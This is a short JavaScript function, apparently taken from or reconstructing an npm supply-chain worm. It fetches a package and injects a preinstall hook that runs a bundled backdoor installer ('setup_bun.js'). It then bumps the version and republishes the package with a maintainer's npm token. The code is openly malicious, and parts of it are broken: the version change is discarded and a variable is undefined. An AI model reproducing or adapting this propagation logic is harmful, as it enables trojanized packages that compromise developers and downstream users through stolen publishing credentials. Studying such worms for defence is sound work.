async function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);

  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));

  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";

  // Increment version
  packageJson.version.replace(/(\d+)\.(\d+)\.(\d+)?/, (_, a, b, c) => `${a}.${b}.${(+c || 0)+ 1}`);

  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);

  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
